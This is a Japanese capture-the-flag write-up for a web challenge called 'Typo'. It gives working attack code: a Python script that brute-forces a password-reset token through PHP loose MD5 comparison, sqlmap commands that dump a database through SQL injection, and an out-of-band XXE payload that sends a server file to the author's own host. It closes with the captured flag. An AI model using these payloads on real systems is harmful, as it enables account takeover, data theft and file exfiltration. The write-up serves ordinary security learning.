# Typo:Web:100pts
I like to count in base 4 and not in base too, this is why this is hard  
Look at my source code, as I am sure you can see my typo  
[https://typhooncon-typo.chals.io/](https://typhooncon-typo.chals.io/)  
Flag format: SSD{...}  
[typo_src.zip](typo_src.zip)  

# Solution
URLとソースが与えられる。  
アクセスするとログインフォームのようだ。  
[site1.png](site/site1.png)  
不正な入力では何も起こらないため、ソースを見る。  
ほとんどのファイルがログイン後にのみ扱えるが、`change.php`や`forgot.php`はログインが不要であった。  
`change.php`では与えた`uid`からDBに保存されているユーザの`token`を取得し、同時に与えた`token`と先頭4文字が一致する場合に、パスワードを与えた`psw`に変更できる。  
つまりトークンを使ったパスワードを忘れたときの更新処理となる(しかしトークンは取得できない)。  
```php
~~~
$uid = mysqli_real_escape_string($mysqli, $_POST['uid']);
$pwd = md5(mysqli_real_escape_string($mysqli, $_POST['psw']));
$sig = mysqli_real_escape_string($mysqli, $_POST['token']);

$sqlGetTokens = "SELECT token from tokens where uid='$uid'";

$result = $mysqli->query($sqlGetTokens);
$data = mysqli_fetch_array($result);
$sigDB = substr($data[0], 0, 4);

if( $sig == $sigDB ){

	$sqlChange = "UPDATE users SET password='$pwd' where id='$uid'";
	$mysqli->query($sqlChange);
	
	$sqlDelete = "DELETE FROM tokens WHERE uid='$uid'";
	$mysqli->query($sqlDelete);
~~~
```
4文字であれば総当たりできそうだと考え、`token`の生成場所を探すと`forgot.php`であった。  
POSTリクエストを受け取るごとに`$unam`と`$time`と`SECRET`より`token`をmd5で生成している。  
```php
~~~
if($_SERVER['REQUEST_METHOD'] == "POST"){
	$uname = mysqli_real_escape_string($mysqli, $_POST['uname']);
	$s = system("date +%s%3N > /tmp/time");
	$time = file_get_contents("/tmp/time");
	$fullToken = md5( $unam . $time . "SECRET" );

	$sqlGetId = "SELECT id FROM users where username='$uname'";
	$result = $mysqli->query($sqlGetId);
	$data = mysqli_fetch_array($result);
	$uid = $data[0];

	$sqlDelete = "DELETE FROM tokens WHERE uid='$uid'";
	$mysqli->query($sqlDelete);

	$sqlInsert = "INSERT INTO tokens values('$uid','$fullToken')";
	$mysqli->query($sqlInsert);
~~~
```
変数名`$unam`がタイポであり常時空なため、リダイレクトの競合状態でファイル`/tmp/time`が空になり`$time`が空になる瞬間を狙おうと考えるが`SECRET`がわからない。  
総当たりも考えられるが65536通りであり、その間にほかのユーザに`token`を再発行されることは間違いない。  
ここで`change.php`の比較が`if( $sig == $sigDB ){`と厳密でないことを思い出す。  
PHPではmd5の厳密でない比較問題がよく知られており、`0eXX`(`X`は数字)のようなものは0と判定される。  
つまり`token`を何度も再発行し、`0eXX`のような形になるタイミングで`0000`などを与えてやると比較を通り抜けパスワードが変更できる(`0000`や`00eX`となるパターンもある)。  
`(1/16)*(1/16)*(10/16)*(10/16)=0.0015`であり、0.15%程度なので十分に可能である。  
`uid`はadminなので1だろうと予測した。  
以下のmd5_attack.pyで`token`ガチャを行う。  
```python
import requests

target = "https://typhooncon-typo.chals.io"
admin_pass = "satoki"

while True:
    try:
        res = requests.post(f"{target}/forgot.php", data={"uname": "admin"})
        print(res.text)
        res = requests.post(f"{target}/change.php", data={"uid": "1", "psw": admin_pass, "token": "0000"})
        print(res.text)
        if "Password Changed." in res.text:
            print("Hacked!!!!")
            print(f"admin password: {admin_pass}")
            res = requests.post(f"{target}/login.php", data={"uname": "admin", "psw": admin_pass, "remember": "on"})
            print(f"cookie: {res.cookies}")
            break
    except:
        pass
```
実行して待つ。  
```bash
$ python md5_attack.py
<script>alert('Token sent to you.');window.location.href='/index.php';</script>
<script>alert('Token is invalid.');window.location.href='/index.php';</script>
<script>alert('Token sent to you.');window.location.href='/index.php';</script>
<script>alert('Token is invalid.');window.location.href='/index.php';</script>
~~~
<script>alert('Token sent to you.');window.location.href='/index.php';</script>
<script>alert('Password Changed.');window.location.href='/index.php';</script>
Hacked!!!!
admin password: satoki
cookie: <RequestsCookieJar[<Cookie PHPSESSID=5odbobfndb0vggtj6qg4ld1ajg for typhooncon-typo.chals.io/>]>
```
パスワードの変更が成功し、ログイン時のcookieが手に入った。  
ログインしてやるとユーザの存在を確認する謎機能が動いていた。  
[site2.png](site/site2.png)  
しかし実行にはUUIDが必要なようだ。  
`read.php`に以下のような記述があるが、`XXXX`ではない。  
```php
~~~
$uuid = $_SERVER['HTTP_UUID'];

if( $uuid != "XXXX" ){
	die("UUID is not valid");
}
~~~
```
UUIDの取得方法を探していると、`data.php`に自明なSQLiがあることがわかる。  
```php
~~~
$uname = $_GET['u'];
$sql = "SELECT email FROM users where username='$uname'";
~~~
```
ひとまずDBをsqlmapでダンプする。  
```bash
$ sqlmap -u "https://typhooncon-typo.chals.io/data.php?u=1" --cookie="PHPSESSID=5odbobfndb0vggtj6qg4ld1ajg" --dbs
~~~
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] typodb
~~~
$ sqlmap -u "https://typhooncon-typo.chals.io/data.php?u=1" --cookie="PHPSESSID=5odbobfndb0vggtj6qg4ld1ajg" -D typodb --tables
~~~
Database: typodb
[3 tables]
+------------+
| secretkeys |
| tokens     |
| users      |
+------------+
~~~
$ sqlmap -u "https://typhooncon-typo.chals.io/data.php?u=1" --cookie="PHPSESSID=5odbobfndb0vggtj6qg4ld1ajg" -D typodb -T secretkeys --dump
~~~
Database: typodb
Table: secretkeys
[1 entry]
+--------------------------------------+
| uuidkey                              |
+--------------------------------------+
| 8d6ed261-f84f-4eda-b2d2-16332bd8c390 |
+--------------------------------------+
~~~
```
UUIDが保存されていた。  
これでユーザの存在を確認する機能が使用できる。  
機能を調査するとxmlを読み込んでいるようだ。  
```php
~~~
$xml = urldecode($_POST['data']);

$dom = new DOMDocument();
try{
	@$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
}catch (Exception $e){
	echo '';
}
$userInfo = @simplexml_import_dom($dom);
$output = "User Sucessfully Added.";
~~~
```
XXEを狙うが、ページの応答からデータを読み取ることはできない。  
以下のdtd.xmlを自身のサーバでホスティングし、[XXE OOB with DTD and PHP filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter)を行う。  
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://[自鯖IP]/dtd.xml?%data;'>">
```
ファイルが存在しない場合、base64のリクエストが到達しない。  
`/var/www/flag`は推測する。  
以下のようなxmlをパーセントエンコーディングし、XXEを行う。  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://[自鯖IP]/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
<user><username>admin</username></user>
```
curlで投げてやる。  
```bash
$ curl -X POST https://typhooncon-typo.chals.io/read.php -H "UUID: 8d6ed261-f84f-4eda-b2d2-16332bd8c390" -H "Cookie: PHPSESSID=5odbobfndb0vggtj6qg4ld1ajg" -d "data=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3C%21DOCTYPE+r+%5B%0D%0A%3C%21ELEMENT+r+ANY+%3E%0D%0A%3C%21ENTITY+%25+sp+SYSTEM+%22http%3A%2F%2F[自鯖IP]%2Fdtd.xml%22%3E%0D%0A%25sp%3B%0D%0A%25param1%3B%0D%0A%5D%3E%0D%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E%0D%0A%3Cuser%3E%3Cusername%3Eadmin%3C%2Fusername%3E%3C%2Fuser%3E"
User is not exists
```
すると以下のリクエストが到達する。  
```bash
$ ls
dtd.xml
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
167.172.241.252 - - [22/Jun/2022 00:00:00] "GET /dtd.xml HTTP/1.0" 200 -
167.172.241.252 - - [22/Jun/2022 00:00:00] "GET /dtd.xml?SSB3aXNoIGZsbGxsYWdnZ2dnIHdhcyBzcGVsbGxsbGxlZCB3aXRoIG11bHRwbGUgZ2dnZyBhbmQgbGxsbGwKU1NEezE5ZTAxNzY5ZjU2MjA3Y2I0NjIwMTczZjlhYTg3ODliYTViOWU3MWF9Cg== HTTP/1.0" 200 -
$ echo "SSB3aXNoIGZsbGxsYWdnZ2dnIHdhcyBzcGVsbGxsbGxlZCB3aXRoIG11bHRwbGUgZ2dnZyBhbmQgbGxsbGwKU1NEezE5ZTAxNzY5ZjU2MjA3Y2I0NjIwMTczZjlhYTg3ODliYTViOWU3MWF9Cg==" | base64 -d
I wish fllllaggggg was spelllllled with multple gggg and lllll
SSD{19e01769f56207cb4620173f9aa8789ba5b9e71a}
```
デコードするとflagが得られた。  

## SSD{19e01769f56207cb4620173f9aa8789ba5b9e71a}